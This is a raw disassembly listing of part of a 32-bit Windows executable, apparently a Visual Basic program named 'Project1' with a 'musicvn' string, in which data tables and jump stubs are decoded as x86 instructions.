  406b26:	ff                   	(bad)
  406b27:	ff 00                	incl   (%eax)
  406b29:	00 00                	add    %al,(%eax)
  406b2b:	00 70 79             	add    %dh,0x79(%eax)
  406b2e:	40                   	inc    %eax
  406b2f:	00 b8 c0 40 00 08    	add    %bh,0x80040c0(%eax)
  406b35:	00 00                	add    %al,(%eax)
  406b37:	00 4c 6b 40          	add    %cl,0x40(%ebx,%ebp,2)
	...
  406b47:	00 4c 6b 40          	add    %cl,0x40(%ebx,%ebp,2)
	...
  406b6b:	00 01                	add    %al,(%ecx)
  406b6d:	00 0b                	add    %cl,(%ebx)
  406b6f:	00 2c 78             	add    %ch,(%eax,%edi,2)
  406b72:	40                   	inc    %eax
  406b73:	00 00                	add    %al,(%eax)
  406b75:	00 00                	add    %al,(%eax)
  406b77:	00 ff                	add    %bh,%bh
  406b79:	ff                   	(bad)
  406b7a:	ff                   	(bad)
  406b7b:	ff                   	(bad)
  406b7c:	ff                   	(bad)
  406b7d:	ff                   	(bad)
  406b7e:	ff                   	(bad)
  406b7f:	ff 00                	incl   (%eax)
  406b81:	00 00                	add    %al,(%eax)
  406b83:	00 90 7a 40 00 24    	add    %dl,0x2400407a(%eax)
  406b89:	c0 40 00 01          	rolb   $0x1,0x0(%eax)
  406b8d:	00 00                	add    %al,(%eax)
  406b8f:	00 bc 6b 40 00 06 00 	add    %bh,0x60040(%ebx,%ebp,2)
  406b96:	20 00                	and    %al,(%eax)
  406b98:	00 00                	add    %al,(%eax)
  406b9a:	00 00                	add    %al,(%eax)
  406b9c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406b9d:	7b 24                	jnp    0x406bc3
  406b9f:	00 a4 6b 40 00 0e 11 	add    %ah,0x110e0040(%ebx,%ebp,2)
  406ba6:	40                   	inc    %eax
  406ba7:	00 1a                	add    %bl,(%edx)
  406ba9:	11 40 00             	adc    %eax,0x0(%eax)
  406bac:	20 11                	and    %dl,(%ecx)
  406bae:	40                   	inc    %eax
  406baf:	00 00                	add    %al,(%eax)
  406bb1:	8c 40 00             	mov    %es,0x0(%eax)
  406bb4:	c8 8b 40 00          	enter  $0x408b,$0x0
  406bb8:	a2 10 40 00 34       	mov    %al,0x34004010
  406bbd:	92                   	xchg   %eax,%edx
  406bbe:	40                   	inc    %eax
  406bbf:	00 ba 34 92 40 00    	add    %bh,0x409234(%edx)
  406bc5:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  406bca:	ff e1                	jmp    *%ecx
  406bcc:	01 00                	add    %eax,(%eax)
  406bce:	0a 00                	or     (%eax),%al
  406bd0:	2c 78                	sub    $0x78,%al
  406bd2:	40                   	inc    %eax
  406bd3:	00 00                	add    %al,(%eax)
  406bd5:	00 00                	add    %al,(%eax)
  406bd7:	00 ff                	add    %bh,%bh
  406bd9:	ff                   	(bad)
  406bda:	ff                   	(bad)
  406bdb:	ff                   	(bad)
  406bdc:	ff                   	(bad)
  406bdd:	ff                   	(bad)
  406bde:	ff                   	(bad)
  406bdf:	ff 00                	incl   (%eax)
  406be1:	00 00                	add    %al,(%eax)
  406be3:	00 60 7a             	add    %ah,0x7a(%eax)
  406be6:	40                   	inc    %eax
  406be7:	00 88 c0 40 00 01    	add    %cl,0x10040c0(%eax)
  406bed:	00 00                	add    %al,(%eax)
  406bef:	00 20                	add    %ah,(%eax)
  406bf1:	6c                   	insb   (%dx),%es:(%edi)
  406bf2:	40                   	inc    %eax
  406bf3:	00 07                	add    %al,(%edi)
  406bf5:	00 20                	add    %ah,(%eax)
  406bf7:	00 00                	add    %al,(%eax)
  406bf9:	00 00                	add    %al,(%eax)
  406bfb:	00 bc 6b 1e 00 04 6c 	add    %bh,0x6c04001e(%ebx,%ebp,2)
  406c02:	40                   	inc    %eax
  406c03:	00 00                	add    %al,(%eax)
  406c05:	8b 40 00             	mov    0x0(%eax),%eax
  406c08:	14 8b                	adc    $0x8b,%al
  406c0a:	40                   	inc    %eax
  406c0b:	00 24 8b             	add    %ah,(%ebx,%ecx,4)
  406c0e:	40                   	inc    %eax
  406c0f:	00 48 8b             	add    %cl,-0x75(%eax)
  406c12:	40                   	inc    %eax
  406c13:	00 54 7e 40          	add    %dl,0x40(%esi,%edi,2)
  406c17:	00 b4 10 40 00 d4 7b 	add    %dh,0x7bd40040(%eax,%edx,1)
  406c1e:	40                   	inc    %eax
  406c1f:	00 68 9c             	add    %ch,-0x64(%eax)
  406c22:	40                   	inc    %eax
  406c23:	00 ba 68 9c 40 00    	add    %bh,0x409c68(%edx)
  406c29:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  406c2e:	ff e1                	jmp    *%ecx
  406c30:	01 00                	add    %eax,(%eax)
  406c32:	06                   	push   %es
  406c33:	00 2c 78             	add    %ch,(%eax,%edi,2)
  406c36:	40                   	inc    %eax
  406c37:	00 00                	add    %al,(%eax)
  406c39:	00 00                	add    %al,(%eax)
  406c3b:	00 ff                	add    %bh,%bh
  406c3d:	ff                   	(bad)
  406c3e:	ff                   	(bad)
  406c3f:	ff                   	(bad)
  406c40:	ff                   	(bad)
  406c41:	ff                   	(bad)
  406c42:	ff                   	(bad)
  406c43:	ff 00                	incl   (%eax)
  406c45:	00 00                	add    %al,(%eax)
  406c47:	00 a0 79 40 00 98    	add    %ah,-0x67ffbf87(%eax)
  406c4d:	c0 40 00 01          	rolb   $0x1,0x0(%eax)
  406c51:	00 00                	add    %al,(%eax)
  406c53:	00 84 6c 40 00 07 00 	add    %al,0x70040(%esp,%ebp,2)
  406c5a:	20 00                	and    %al,(%eax)
  406c5c:	00 00                	add    %al,(%eax)
  406c5e:	00 00                	add    %al,(%eax)
  406c60:	ac                   	lods   %ds:(%esi),%al
  406c61:	fe                   	(bad)
  406c62:	24 00                	and    $0x0,%al
  406c64:	68 6c 40 00 f0       	push   $0xf000406c
  406c69:	10 40 00             	adc    %al,0x0(%eax)
  406c6c:	00 8b 40 00 14 8b    	add    %cl,-0x74ebffc0(%ebx)
  406c72:	40                   	inc    %eax
  406c73:	00 24 8b             	add    %ah,(%ebx,%ecx,4)
  406c76:	40                   	inc    %eax
  406c77:	00 48 8b             	add    %cl,-0x75(%eax)
  406c7a:	40                   	inc    %eax
  406c7b:	00 d2                	add    %dl,%dl
  406c7d:	10 40 00             	adc    %al,0x0(%eax)
  406c80:	d4 7b                	aam    $0x7b
  406c82:	40                   	inc    %eax
  406c83:	00 28                	add    %ch,(%eax)
  406c85:	96                   	xchg   %eax,%esi
  406c86:	40                   	inc    %eax
  406c87:	00 ba 28 96 40 00    	add    %bh,0x409628(%edx)
  406c8d:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  406c92:	ff e1                	jmp    *%ecx
  406c94:	01 00                	add    %eax,(%eax)
  406c96:	04 00                	add    $0x0,%al
  406c98:	2c 78                	sub    $0x78,%al
  406c9a:	40                   	inc    %eax
  406c9b:	00 00                	add    %al,(%eax)
  406c9d:	00 00                	add    %al,(%eax)
  406c9f:	00 ff                	add    %bh,%bh
  406ca1:	ff                   	(bad)
  406ca2:	ff                   	(bad)
  406ca3:	ff                   	(bad)
  406ca4:	ff                   	(bad)
  406ca5:	ff                   	(bad)
  406ca6:	ff                   	(bad)
  406ca7:	ff 00                	incl   (%eax)
  406ca9:	00 00                	add    %al,(%eax)
  406cab:	00 40 79             	add    %al,0x79(%eax)
  406cae:	40                   	inc    %eax
  406caf:	00 78 c0             	add    %bh,-0x40(%eax)
  406cb2:	40                   	inc    %eax
  406cb3:	00 02                	add    %al,(%edx)
  406cb5:	00 00                	add    %al,(%eax)
  406cb7:	00 e8                	add    %ch,%al
  406cb9:	6c                   	insb   (%dx),%es:(%edi)
  406cba:	40                   	inc    %eax
  406cbb:	00 07                	add    %al,(%edi)
  406cbd:	00 20                	add    %ah,(%eax)
  406cbf:	00 00                	add    %al,(%eax)
  406cc1:	00 00                	add    %al,(%eax)
  406cc3:	00 5c 62 1e          	add    %bl,0x1e(%edx,%eiz,2)
  406cc7:	00 cc                	add    %cl,%ah
  406cc9:	6c                   	insb   (%dx),%es:(%edi)
  406cca:	40                   	inc    %eax
  406ccb:	00 7c 6d 40          	add    %bh,0x40(%ebp,%ebp,2)
  406ccf:	00 d8                	add    %bl,%al
  406cd1:	10 40 00             	adc    %al,0x0(%eax)
  406cd4:	de 10                	ficoms (%eax)
  406cd6:	40                   	inc    %eax
  406cd7:	00 e4                	add    %ah,%ah
  406cd9:	10 40 00             	adc    %al,0x0(%eax)
  406cdc:	ea 10 40 00 60 88 40 	ljmp   $0x4088,$0x60004010
  406ce3:	00 fc                	add    %bh,%ah
  406ce5:	6c                   	insb   (%dx),%es:(%edi)
  406ce6:	40                   	inc    %eax
  406ce7:	00 dc                	add    %bl,%ah
  406ce9:	9d                   	popf
  406cea:	40                   	inc    %eax
  406ceb:	00 8c 8e 40 00 ba dc 	add    %cl,-0x2345ffc0(%esi,%ecx,4)
  406cf2:	9d                   	popf
  406cf3:	40                   	inc    %eax
  406cf4:	00 b9 2c 11 40 00    	add    %bh,0x40112c(%ecx)
  406cfa:	ff e1                	jmp    *%ecx
  406cfc:	ba 8c 8e 40 00       	mov    $0x408e8c,%edx
  406d01:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  406d06:	ff e1                	jmp    *%ecx
  406d08:	01 00                	add    %eax,(%eax)
  406d0a:	09 00                	or     %eax,(%eax)
  406d0c:	2c 78                	sub    $0x78,%al
  406d0e:	40                   	inc    %eax
  406d0f:	00 00                	add    %al,(%eax)
  406d11:	00 00                	add    %al,(%eax)
  406d13:	00 ff                	add    %bh,%bh
  406d15:	ff                   	(bad)
  406d16:	ff                   	(bad)
  406d17:	ff                   	(bad)
  406d18:	ff                   	(bad)
  406d19:	ff                   	(bad)
  406d1a:	ff                   	(bad)
  406d1b:	ff 00                	incl   (%eax)
  406d1d:	00 00                	add    %al,(%eax)
  406d1f:	00 30                	add    %dh,(%eax)
  406d21:	7a 40                	jp     0x406d63
  406d23:	00 34 c0             	add    %dh,(%eax,%eax,8)
  406d26:	40                   	inc    %eax
  406d27:	00 02                	add    %al,(%edx)
  406d29:	00 00                	add    %al,(%eax)
  406d2b:	00 74 6d 40          	add    %dh,0x40(%ebp,%ebp,2)
  406d2f:	00 0d 00 20 00 00    	add    %cl,0x2000
  406d35:	00 00                	add    %al,(%eax)
  406d37:	00 3c b8             	add    %bh,(%eax,%edi,4)
  406d3a:	21 00                	and    %eax,(%eax)
  406d3c:	40                   	inc    %eax
  406d3d:	6d                   	insl   (%dx),%es:(%edi)
  406d3e:	40                   	inc    %eax
  406d3f:	00 4c c7 40          	add    %cl,0x40(%edi,%eax,8)
  406d43:	00 e4                	add    %ah,%ah
  406d45:	7d 40                	jge    0x406d87
  406d47:	00 d4                	add    %dl,%ah
  406d49:	7d 40                	jge    0x406d8b
  406d4b:	00 f4                	add    %dh,%ah
  406d4d:	7d 40                	jge    0x406d8f
  406d4f:	00 74 7e 40          	add    %dh,0x40(%esi,%edi,2)
  406d53:	00 88 8b 40 00 dc    	add    %cl,-0x23ffbf75(%eax)
  406d59:	88 40 00             	mov    %al,0x0(%eax)
  406d5c:	a8 8b                	test   $0x8b,%al
  406d5e:	40                   	inc    %eax
  406d5f:	00 e0                	add    %ah,%al
  406d61:	8a 40 00             	mov    0x0(%eax),%al
  406d64:	02 11                	add    (%ecx),%dl
  406d66:	40                   	inc    %eax
  406d67:	00 08                	add    %cl,(%eax)
  406d69:	11 40 00             	adc    %eax,0x0(%eax)
  406d6c:	90                   	nop
  406d6d:	8a 40 00             	mov    0x0(%eax),%al
  406d70:	fc                   	cld
  406d71:	10 40 00             	adc    %al,0x0(%eax)
  406d74:	dc 8f 40 00 40 9f    	fmull  -0x60bfffc0(%edi)
  406d7a:	40                   	inc    %eax
  406d7b:	00 ba dc 8f 40 00    	add    %bh,0x408fdc(%edx)
  406d81:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  406d86:	ff e1                	jmp    *%ecx
  406d88:	ba 40 9f 40 00       	mov    $0x409f40,%edx
  406d8d:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  406d92:	ff e1                	jmp    *%ecx
  406d94:	56                   	push   %esi
  406d95:	42                   	inc    %edx
  406d96:	35 21 f0 1f 2a       	xor    $0x2a1ff021,%eax
	...
  406da7:	00 7e 00             	add    %bh,0x0(%esi)
	...
  406db6:	0a 00                	or     (%eax),%al
  406db8:	09 04 00             	or     %eax,(%eax,%eax,1)
	...
  406dc3:	00 34 73             	add    %dh,(%ebx,%esi,2)
  406dc6:	40                   	inc    %eax
  406dc7:	00 00                	add    %al,(%eax)
  406dc9:	f8                   	clc
  406dca:	32 00                	xor    (%eax),%al
  406dcc:	00 ff                	add    %bh,%bh
  406dce:	ff                   	(bad)
  406dcf:	ff 08                	decl   (%eax)
  406dd1:	00 00                	add    %al,(%eax)
  406dd3:	00 01                	add    %al,(%ecx)
  406dd5:	00 00                	add    %al,(%eax)
  406dd7:	00 01                	add    %al,(%ecx)
  406dd9:	00 00                	add    %al,(%eax)
  406ddb:	00 e9                	add    %ch,%cl
  406ddd:	00 00                	add    %al,(%eax)
  406ddf:	00 6c 6a 40          	add    %ch,0x40(%edx,%ebp,2)
  406de3:	00 6c 6a 40          	add    %ch,0x40(%edx,%ebp,2)
  406de7:	00 5c 11 40          	add    %bl,0x40(%ecx,%edx,1)
  406deb:	00 78 00             	add    %bh,0x0(%eax)
  406dee:	00 00                	add    %al,(%eax)
  406df0:	80 00 00             	addb   $0x0,(%eax)
  406df3:	00 92 00 00 00 93    	add    %dl,-0x6d000000(%edx)
	...
  406e09:	00 00                	add    %al,(%eax)
  406e0b:	00 6d 75             	add    %ch,0x75(%ebp)
  406e0e:	73 69                	jae    0x406e79
  406e10:	63 76 6e             	arpl   %esi,0x6e(%esi)
  406e13:	00 4d 69             	add    %cl,0x69(%ebp)
  406e16:	63 72 6f             	arpl   %esi,0x6f(%edx)
  406e19:	73 6f                	jae    0x406e8a
  406e1b:	66 74 20             	data16 je 0x406e3e
  406e1e:	57                   	push   %edi
  406e1f:	69 6e 64 6f 77 73 00 	imul   $0x73776f,0x64(%esi),%ebp
  406e26:	00 50 72             	add    %dl,0x72(%eax)
  406e29:	6f                   	outsl  %ds:(%esi),(%dx)
  406e2a:	6a 65                	push   $0x65
  406e2c:	63 74 31 00          	arpl   %esi,0x0(%ecx,%esi,1)
  406e30:	01 00                	add    %eax,(%eax)
  406e32:	03 00                	add    (%eax),%eax
  406e34:	2c 78                	sub    $0x78,%al
  406e36:	40                   	inc    %eax
  406e37:	00 00                	add    %al,(%eax)
  406e39:	00 00                	add    %al,(%eax)
  406e3b:	00 ff                	add    %bh,%bh
  406e3d:	ff                   	(bad)
  406e3e:	ff                   	(bad)
  406e3f:	ff                   	(bad)
  406e40:	ff                   	(bad)
  406e41:	ff                   	(bad)
  406e42:	ff                   	(bad)
  406e43:	ff 00                	incl   (%eax)
  406e45:	00 00                	add    %al,(%eax)
  406e47:	00 10                	add    %dl,(%eax)
  406e49:	79 40                	jns    0x406e8b
  406e4b:	00 58 c0             	add    %bl,-0x40(%eax)
  406e4e:	40                   	inc    %eax
  406e4f:	00 03                	add    %al,(%ebx)
  406e51:	00 00                	add    %al,(%eax)
  406e53:	00 a0 6e 40 00 0e    	add    %ah,0xe00406e(%eax)
  406e59:	00 20                	add    %ah,(%eax)
  406e5b:	00 00                	add    %al,(%eax)
  406e5d:	00 00                	add    %al,(%eax)
  406e5f:	00 2c 84             	add    %ch,(%esp,%eax,4)
  406e62:	1f                   	pop    %ds
  406e63:	00 68 6e             	add    %ch,0x6e(%eax)
  406e66:	40                   	inc    %eax
  406e67:	00 ec                	add    %ch,%ah
  406e69:	87 40 00             	xchg   %eax,0x0(%eax)
  406e6c:	c0 10 40             	rclb   $0x40,(%eax)
  406e6f:	00 c6                	add    %al,%dh
  406e71:	10 40 00             	adc    %al,0x0(%eax)
  406e74:	cc                   	int3
  406e75:	10 40 00             	adc    %al,0x0(%eax)
  406e78:	24 88                	and    $0x88,%al
  406e7a:	40                   	inc    %eax
  406e7b:	00 44 88 40          	add    %al,0x40(%eax,%ecx,4)
  406e7f:	00 50 88             	add    %dl,-0x78(%eax)
  406e82:	40                   	inc    %eax
  406e83:	00 d2                	add    %dl,%dl
  406e85:	10 40 00             	adc    %al,0x0(%eax)
  406e88:	7c 6d                	jl     0x406ef7
  406e8a:	40                   	inc    %eax
  406e8b:	00 60 88             	add    %ah,-0x78(%eax)
  406e8e:	40                   	inc    %eax
  406e8f:	00 ac 6e 40 00 78 88 	add    %ch,-0x7787ffc0(%esi,%ebp,2)
  406e96:	40                   	inc    %eax
  406e97:	00 9c 88 40 00 b0 88 	add    %bl,-0x774fffc0(%eax,%ecx,4)
  406e9e:	40                   	inc    %eax
  406e9f:	00 e8                	add    %ch,%al
  406ea1:	ad                   	lods   %ds:(%esi),%eax
  406ea2:	40                   	inc    %eax
  406ea3:	00 10                	add    %dl,(%eax)
  406ea5:	95                   	xchg   %eax,%ebp
  406ea6:	40                   	inc    %eax
  406ea7:	00 18                	add    %bl,(%eax)
  406ea9:	93                   	xchg   %eax,%ebx
  406eaa:	40                   	inc    %eax
  406eab:	00 ba e8 ad 40 00    	add    %bh,0x40ade8(%edx)
  406eb1:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  406eb6:	ff e1                	jmp    *%ecx
  406eb8:	ba 10 95 40 00       	mov    $0x409510,%edx
  406ebd:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  406ec2:	ff e1                	jmp    *%ecx
  406ec4:	ba 18 93 40 00       	mov    $0x409318,%edx
  406ec9:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  406ece:	ff e1                	jmp    *%ecx
  406ed0:	01 00                	add    %eax,(%eax)
  406ed2:	01 00                	add    %eax,(%eax)
  406ed4:	2c 78                	sub    $0x78,%al
  406ed6:	40                   	inc    %eax
  406ed7:	00 00                	add    %al,(%eax)
  406ed9:	00 00                	add    %al,(%eax)
  406edb:	00 68 8c             	add    %ch,-0x74(%eax)
  406ede:	40                   	inc    %eax
  406edf:	00 ff                	add    %bh,%bh
  406ee1:	ff                   	(bad)
  406ee2:	ff                   	(bad)
  406ee3:	ff 00                	incl   (%eax)
  406ee5:	00 00                	add    %al,(%eax)
  406ee7:	00 b0 78 40 00 44    	add    %dh,0x44004078(%eax)
  406eed:	c0 40 00 00          	rolb   $0x0,0x0(%eax)
  406ef1:	00 00                	add    %al,(%eax)
  406ef3:	00 d0                	add    %dl,%al
  406ef5:	02 1b                	add    (%ebx),%bl
	...
  406f03:	00 48 6f             	add    %cl,0x6f(%eax)
  406f06:	40                   	inc    %eax
  406f07:	00 01                	add    %al,(%ecx)
  406f09:	00 00                	add    %al,(%eax)
  406f0b:	00 f8                	add    %bh,%al
  406f0d:	7e 40                	jle    0x406f4f
  406f0f:	00 00                	add    %al,(%eax)
  406f11:	00 00                	add    %al,(%eax)
  406f13:	00 48 6f             	add    %cl,0x6f(%eax)
  406f16:	40                   	inc    %eax
  406f17:	00 01                	add    %al,(%ecx)
  406f19:	00 00                	add    %al,(%eax)
  406f1b:	00 50 6f             	add    %dl,0x6f(%eax)
  406f1e:	40                   	inc    %eax
  406f1f:	00 00                	add    %al,(%eax)
  406f21:	00 00                	add    %al,(%eax)
  406f23:	00 4c 6f 40          	add    %cl,0x40(%edi,%ebp,2)
  406f27:	00 01                	add    %al,(%ecx)
  406f29:	00 00                	add    %al,(%eax)
  406f2b:	00 50 6f             	add    %dl,0x6f(%eax)
  406f2e:	40                   	inc    %eax
  406f2f:	00 00                	add    %al,(%eax)
  406f31:	00 00                	add    %al,(%eax)
  406f33:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406f36:	10 00                	adc    %al,(%eax)
  406f38:	78 6f                	js     0x406fa9
  406f3a:	40                   	inc    %eax
  406f3b:	00 84 c8 40 00 00 00 	add    %al,0x40(%eax,%ecx,8)
  406f42:	00 00                	add    %al,(%eax)
  406f44:	ec                   	in     (%dx),%al
  406f45:	41                   	inc    %ecx
  406f46:	1f                   	pop    %ds
  406f47:	00 08                	add    %cl,(%eax)
  406f49:	7f 40                	jg     0x406f8b
  406f4b:	00 18                	add    %bl,(%eax)
  406f4d:	7f 40                	jg     0x406f8f
  406f4f:	00 40 00             	add    %al,0x0(%eax)
  406f52:	02 00                	add    (%eax),%al
  406f54:	34 00                	xor    $0x0,%al
  406f56:	00 00                	add    %al,(%eax)
  406f58:	28 7f 40             	sub    %bh,0x40(%edi)
  406f5b:	00 ff                	add    %bh,%bh
  406f5d:	ff                   	(bad)
  406f5e:	ff                   	(bad)
  406f5f:	ff 00                	incl   (%eax)
  406f61:	00 00                	add    %al,(%eax)
  406f63:	00 00                	add    %al,(%eax)
  406f65:	00 00                	add    %al,(%eax)
  406f67:	00 78 6f             	add    %bh,0x6f(%eax)
  406f6a:	40                   	inc    %eax
  406f6b:	00 c0                	add    %al,%al
  406f6d:	d4 19                	aam    $0x19
  406f6f:	00 38                	add    %bh,(%eax)
  406f71:	7f 40                	jg     0x406fb3
  406f73:	00 ff                	add    %bh,%bh
  406f75:	ff                   	(bad)
  406f76:	ff                   	(bad)
  406f77:	ff 00                	incl   (%eax)
  406f79:	00 00                	add    %al,(%eax)
  406f7b:	00 50 6f             	add    %dl,0x6f(%eax)
  406f7e:	40                   	inc    %eax
  406f7f:	00 d0                	add    %dl,%al
  406f81:	6e                   	outsb  %ds:(%esi),(%dx)
  406f82:	40                   	inc    %eax
  406f83:	00 32                	add    %dh,(%edx)
  406f85:	11 40 00             	adc    %eax,0x0(%eax)
  406f88:	38 11                	cmp    %dl,(%ecx)
  406f8a:	40                   	inc    %eax
  406f8b:	00 3e                	add    %bh,(%esi)
  406f8d:	11 40 00             	adc    %eax,0x0(%eax)
	...
  406f98:	07                   	pop    %es
  406f99:	00 00                	add    %al,(%eax)
  406f9b:	00 c8                	add    %cl,%al
  406f9d:	8a 40 00             	mov    0x0(%eax),%al
  406fa0:	07                   	pop    %es
  406fa1:	00 00                	add    %al,(%eax)
  406fa3:	00 78 8a             	add    %bh,-0x76(%eax)
  406fa6:	40                   	inc    %eax
  406fa7:	00 07                	add    %al,(%edi)
  406fa9:	00 00                	add    %al,(%eax)
  406fab:	00 30                	add    %dh,(%eax)
  406fad:	8a 40 00             	mov    0x0(%eax),%al
  406fb0:	07                   	pop    %es
  406fb1:	00 00                	add    %al,(%eax)
  406fb3:	00 e8                	add    %ch,%al
  406fb5:	89 40 00             	mov    %eax,0x0(%eax)
  406fb8:	07                   	pop    %es
  406fb9:	00 00                	add    %al,(%eax)
  406fbb:	00 9c 89 40 00 07 00 	add    %bl,0x70040(%ecx,%ecx,4)
  406fc2:	00 00                	add    %al,(%eax)
  406fc4:	54                   	push   %esp
  406fc5:	89 40 00             	mov    %eax,0x0(%eax)
  406fc8:	07                   	pop    %es
  406fc9:	00 00                	add    %al,(%eax)
  406fcb:	00 0c 89             	add    %cl,(%ecx,%ecx,4)
  406fce:	40                   	inc    %eax
  406fcf:	00 07                	add    %al,(%edi)
  406fd1:	00 00                	add    %al,(%eax)
  406fd3:	00 c4                	add    %al,%ah
  406fd5:	88 40 00             	mov    %al,0x0(%eax)
  406fd8:	07                   	pop    %es
  406fd9:	00 00                	add    %al,(%eax)
  406fdb:	00 90 84 40 00 07    	add    %dl,0x7004084(%eax)
  406fe1:	00 00                	add    %al,(%eax)
  406fe3:	00 44 84 40          	add    %al,0x40(%esp,%eax,4)
  406fe7:	00 07                	add    %al,(%edi)
  406fe9:	00 00                	add    %al,(%eax)
  406feb:	00 f8                	add    %bh,%al
  406fed:	83 40 00 07          	addl   $0x7,0x0(%eax)
  406ff1:	00 00                	add    %al,(%eax)
  406ff3:	00 a8 83 40 00 07    	add    %ch,0x7004083(%eax)
  406ff9:	00 00                	add    %al,(%eax)
  406ffb:	00 4c 83 40          	add    %cl,0x40(%ebx,%eax,4)
  406fff:	00 07                	add    %al,(%edi)
  407001:	00 00                	add    %al,(%eax)
  407003:	00 04 83             	add    %al,(%ebx,%eax,4)
  407006:	40                   	inc    %eax
  407007:	00 07                	add    %al,(%edi)
  407009:	00 00                	add    %al,(%eax)
  40700b:	00 bc 82 40 00 07 00 	add    %bh,0x70040(%edx,%eax,4)
  407012:	00 00                	add    %al,(%eax)
  407014:	74 82                	je     0x406f98
  407016:	40                   	inc    %eax
  407017:	00 07                	add    %al,(%edi)
  407019:	00 00                	add    %al,(%eax)
  40701b:	00 2c 82             	add    %ch,(%edx,%eax,4)
  40701e:	40                   	inc    %eax
  40701f:	00 07                	add    %al,(%edi)
  407021:	00 00                	add    %al,(%eax)
  407023:	00 e8                	add    %ch,%al
  407025:	81 40 00 07 00 00 00 	addl   $0x7,0x0(%eax)
  40702c:	88 81 40 00 07 00    	mov    %al,0x70040(%ecx)
  407032:	00 00                	add    %al,(%eax)
  407034:	40                   	inc    %eax
  407035:	81 40 00 07 00 00 00 	addl   $0x7,0x0(%eax)
  40703c:	f8                   	clc
  40703d:	80 40 00 07          	addb   $0x7,0x0(%eax)
  407041:	00 00                	add    %al,(%eax)
  407043:	00 b0 80 40 00 07    	add    %dh,0x7004080(%eax)
  407049:	00 00                	add    %al,(%eax)
  40704b:	00 68 80             	add    %ch,-0x80(%eax)
  40704e:	40                   	inc    %eax
  40704f:	00 07                	add    %al,(%edi)
  407051:	00 00                	add    %al,(%eax)
  407053:	00 1c 80             	add    %bl,(%eax,%eax,4)
  407056:	40                   	inc    %eax
  407057:	00 06                	add    %al,(%esi)
  407059:	00 00                	add    %al,(%eax)
  40705b:	00 d4                	add    %dl,%ah
  40705d:	7e 40                	jle    0x40709f
  40705f:	00 07                	add    %al,(%edi)
  407061:	00 00                	add    %al,(%eax)
  407063:	00 10                	add    %dl,(%eax)
  407065:	7e 40                	jle    0x4070a7
  407067:	00 07                	add    %al,(%edi)
  407069:	00 00                	add    %al,(%eax)
  40706b:	00 84 7d 40 00 07 00 	add    %al,0x70040(%ebp,%edi,2)
  407072:	00 00                	add    %al,(%eax)
  407074:	40                   	inc    %eax
  407075:	7d 40                	jge    0x4070b7
  407077:	00 07                	add    %al,(%edi)
  407079:	00 00                	add    %al,(%eax)
  40707b:	00 f8                	add    %bh,%al
  40707d:	7c 40                	jl     0x4070bf
  40707f:	00 01                	add    %al,(%ecx)
  407081:	00 02                	add    %al,(%edx)
  407083:	00 2c 78             	add    %ch,(%eax,%edi,2)
  407086:	40                   	inc    %eax
  407087:	00 00                	add    %al,(%eax)
  407089:	00 00                	add    %al,(%eax)
  40708b:	00 ff                	add    %bh,%bh
  40708d:	ff                   	(bad)
  40708e:	ff                   	(bad)
  40708f:	ff                   	(bad)
  407090:	ff                   	(bad)
  407091:	ff                   	(bad)
  407092:	ff                   	(bad)
  407093:	ff 00                	incl   (%eax)
  407095:	00 00                	add    %al,(%eax)
  407097:	00 e0                	add    %ah,%al
  407099:	78 40                	js     0x4070db
  40709b:	00 14 c0             	add    %dl,(%eax,%eax,8)
  40709e:	40                   	inc    %eax
  40709f:	00 05 00 00 00 48    	add    %al,0x48000000
  4070a5:	71 40                	jno    0x4070e7
  4070a7:	00 24 00             	add    %ah,(%eax,%eax,1)
  4070aa:	40                   	inc    %eax
  4070ab:	00 00                	add    %al,(%eax)
  4070ad:	00 00                	add    %al,(%eax)
  4070af:	00 e4                	add    %ah,%ah
  4070b1:	6a 15                	push   $0x15
  4070b3:	00 b8 70 40 00 4c    	add    %bh,0x4c004070(%eax)
  4070b9:	c7 40 00 e4 7d 40 00 	movl   $0x407de4,0x0(%eax)
  4070c0:	d4 7d                	aam    $0x7d
  4070c2:	40                   	inc    %eax
  4070c3:	00 f4                	add    %dh,%ah
  4070c5:	7d 40                	jge    0x407107
  4070c7:	00 54 7e 40          	add    %dl,0x40(%esi,%edi,2)
  4070cb:	00 c4                	add    %al,%ah
  4070cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4070ce:	40                   	inc    %eax
  4070cf:	00 28                	add    %ch,(%eax)
  4070d1:	7e 40                	jle    0x407113
  4070d3:	00 7c 6d 40          	add    %bh,0x40(%ebp,%ebp,2)
  4070d7:	00 b4 7f 40 00 b8 6e 	add    %dh,0x6eb80040(%edi,%edi,2)
  4070de:	40                   	inc    %eax
  4070df:	00 d4                	add    %dl,%ah
  4070e1:	7b 40                	jnp    0x407123
  4070e3:	00 34 85 40 00 c8 84 	add    %dh,-0x7b37ffc0(,%eax,4)
  4070ea:	40                   	inc    %eax
  4070eb:	00 c8                	add    %cl,%al
  4070ed:	72 40                	jb     0x40712f
  4070ef:	00 58 85             	add    %bl,-0x7b(%eax)
  4070f2:	40                   	inc    %eax
  4070f3:	00 f0                	add    %dh,%al
  4070f5:	6c                   	insb   (%dx),%es:(%edi)
  4070f6:	40                   	inc    %eax
  4070f7:	00 ae 10 40 00 24    	add    %ch,0x24004010(%esi)
  4070fd:	6c                   	insb   (%dx),%es:(%edi)
  4070fe:	40                   	inc    %eax
  4070ff:	00 88 6c 40 00 08    	add    %cl,0x800406c(%eax)
  407105:	6b 40 00 b4          	imul   $0xffffffb4,0x0(%eax),%eax
  407109:	10 40 00             	adc    %al,0x0(%eax)
  40710c:	80 85 40 00 ba 10 40 	addb   $0x40,0x10ba0040(%ebp)
  407113:	00 2c 86             	add    %ch,(%esi,%eax,4)
  407116:	40                   	inc    %eax
  407117:	00 14 86             	add    %dl,(%esi,%eax,4)
  40711a:	40                   	inc    %eax
  40711b:	00 90 85 40 00 d4    	add    %dl,-0x2bffbf7b(%eax)
  407121:	72 40                	jb     0x407163
  407123:	00 d0                	add    %dl,%al
  407125:	81 40 00 34 86 40 00 	addl   $0x408634,0x0(%eax)
  40712c:	b0 86                	mov    $0x86,%al
